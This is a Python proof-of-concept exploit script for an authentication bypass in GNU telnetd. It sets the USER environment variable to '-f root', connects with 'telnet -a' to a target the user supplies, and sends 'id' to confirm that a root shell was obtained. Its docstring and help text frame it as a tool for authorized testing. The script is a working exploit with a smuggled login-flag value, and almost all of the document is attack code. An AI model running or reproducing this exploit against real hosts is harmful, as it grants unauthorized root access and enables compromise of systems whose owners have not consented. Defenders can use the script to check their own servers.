#!/usr/bin/env python3
"""
GNU telnetd Authentication Bypass Vulnerability PoC

Vulnerability Type: Authentication Bypass
Affected: GNU telnetd with certain configurations

Description:
    This script tests for a vulnerability in GNU telnetd where setting the
    USER environment variable to "-f root" can bypass authentication and
    obtain a root shell.

Usage:
    python3 gnu_telnetd_auth_bypass.py <target>

Example:
    python3 gnu_telnetd_auth_bypass.py 192.168.1.100

Author: Security Researcher
License: MIT License
Disclaimer: For authorized security testing and educational purposes only.
"""

import pexpect
import os
import sys
import re
import argparse


def verify(target, timeout=10):
    """
    Test if the target is vulnerable to GNU telnetd auth bypass.

    Args:
        target: Target IP address or hostname
        timeout: Connection timeout in seconds (default: 10)

    Returns:
        bool: True if vulnerable, False otherwise
    """
    print(f"[+] Testing telnetd auth bypass on {target}")

    # Set USER environment variable to exploit the vulnerability
    env = os.environ.copy()
    env["USER"] = "-f root"

    # Spawn telnet connection with malicious environment
    child = pexpect.spawn(
        f"telnet -a {target}",
        env=env,
        encoding="utf-8",
        codec_errors="ignore",
        timeout=timeout
    )

    try:
        # Wait for any output (banner / shell / login prompt)
        child.expect([pexpect.TIMEOUT, r'.*'], timeout=3)

        # Send 'id' command to check privileges
        child.sendline("id")

        # Wait for id command output
        child.expect(r'uid=\d+.*', timeout=5)
        output = child.after

        print(f"[+] id output: {output.strip()}")

        # Check if we have root privileges
        if "uid=0(root)" in output:
            print("[!!!] VULNERABLE: Authentication bypass confirmed (root shell obtained)")
            return True
        else:
            print("[-] Not vulnerable: No root privileges obtained")

    except pexpect.TIMEOUT:
        print("[-] Timeout: Unable to determine vulnerability status")
    except Exception as e:
        print(f"[-] Error occurred: {e}")
    finally:
        try:
            child.sendline("exit")
        except Exception:
            pass

    return False


def main():
    """Main entry point for the PoC script."""
    parser = argparse.ArgumentParser(
        description="GNU telnetd Authentication Bypass Vulnerability PoC\n\n"
                    "This script tests for a vulnerability in GNU telnetd where setting the\n"
                    "USER environment variable to \"-f root\" can bypass authentication and\n"
                    "obtain a root shell.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Examples:\n"
               "  %(prog)s 192.168.1.100\n"
               "  %(prog)s example.com -t 15\n\n"
               "Disclaimer: For authorized security testing and educational purposes only."
    )
    parser.add_argument(
        "target",
        help="Target IP address or hostname"
    )
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=10,
        metavar="SECONDS",
        help="Connection timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )

    args = parser.parse_args()

    result = verify(args.target, args.timeout)

    if result:
        sys.exit(0)  # Vulnerable
    else:
        sys.exit(1)  # Not vulnerable or error


if __name__ == "__main__":
    main()
